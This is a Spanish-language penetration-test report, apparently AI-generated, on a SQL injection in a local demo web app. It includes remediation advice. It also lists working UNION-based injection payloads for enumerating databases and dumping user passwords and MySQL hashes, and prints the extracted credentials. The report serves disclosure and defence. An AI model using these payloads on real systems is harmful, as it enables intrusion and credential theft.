# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:03:32  
**Modelo:** claude-sonnet-4.6  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection clásica (UNION-based)** en el parámetro `id` del formulario de búsqueda de usuarios. La vulnerabilidad permite extraer información completa de la base de datos, incluyendo credenciales de usuarios.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (In-band / UNION-based) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Severidad** | **CRÍTICA** |
| **CVSS** | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |

---

## Pruebas Realizadas

### 1. Confirmación de la vulnerabilidad

**Payload:** `id=1' OR '1'='1`  
**Resultado:** Se devolvieron todos los registros de la tabla, confirmando la inyección.

```
ID: 1' OR '1'='1 | First name: John | Surname: Doe
ID: 1' OR '1'='1 | First name: Jane | Surname: Smith
ID: 1' OR '1'='1 | First name: Bob  | Surname: Johnson
... (8 registros totales)
```

### 2. Determinación de columnas (UNION)

**Payload:** `id=0' UNION SELECT 'a','b'-- `  
**Resultado:** La consulta tiene **2 columnas** accesibles.

```
ID: ... | First name: a | Surname: b
```

### 3. Extracción de información del servidor

**Payload:** `id=0' UNION SELECT version(),database()-- `

```
Versión DB:  10.11.14-MariaDB-ubu2204
Base de datos actual: sqli_demo
Usuario DB:  root@172.18.0.3
Hostname:    37fb16ccfff3
```

### 4. Enumeración de bases de datos

**Payload:** `id=0' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata-- `

```
Bases de datos encontradas:
- information_schema
- sqli_demo
- sys
- mysql
- performance_schema
```

### 5. Enumeración de tablas

**Base de datos `sqli_demo`:**  
Tabla encontrada: `users`

**Columnas de `users`:** `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### 6. Extracción de credenciales de la aplicación

**Payload:** `id=0' UNION SELECT group_concat(username,0x3a,password),2 FROM sqli_demo.users-- `

| Usuario | Contraseña |
|---------|-----------|
| admin | password123 |
| jsmith | secret456 |
| bjohnson | mypass789 |
| awilliams | qwerty123 |
| cbrown | password |
| ddavis | secure123 |
| emiller | hackme |
| fwilson | admin123 |

### 7. Extracción de hashes del sistema MySQL

**Payload:** `id=0' UNION SELECT group_concat(User,0x3a,Password),2 FROM mysql.user-- `

| Usuario MySQL | Hash |
|---------------|------|
| root | *3800D13EE735ED411CBC3F23B2A2E19C63CE0BEC |
| healthcheck | *0FAFBC89BB0398E7360281A0B3BB84D82CADA004 |

> **Nota:** Las contraseñas de la aplicación están almacenadas en **texto plano** (sin hash), lo que agrava significativamente el impacto.

---

## Causa Raíz

La aplicación construye la consulta SQL concatenando directamente el input del usuario sin sanitización:

```php
// Código vulnerable (hipotético)
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

El input `1' OR '1'='1` produce:
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

---

## Impacto

- **Confidencialidad:** ALTO — Exposición total de datos de usuarios y credenciales del sistema de base de datos.
- **Integridad:** ALTO — El usuario `root` podría modificar cualquier dato.
- **Disponibilidad:** ALTO — Posible eliminación de datos o denegación de servicio.

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y sanitizar inputs:** Aplicar validación estricta del tipo de dato esperado (entero para IDs).

3. **Hashear contraseñas:** Usar `bcrypt` o `argon2` para almacenar contraseñas.

4. **Principio de mínimo privilegio:** La aplicación no debería conectarse a la base de datos como `root`.

5. **WAF:** Implementar un Web Application Firewall para detectar y bloquear payloads de SQLi.

---

## Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica** de SQL Injection que permite la extracción completa de datos sensibles, incluyendo credenciales de todos los usuarios y hashes de contraseñas del servidor MySQL. Se recomienda corrección inmediata.
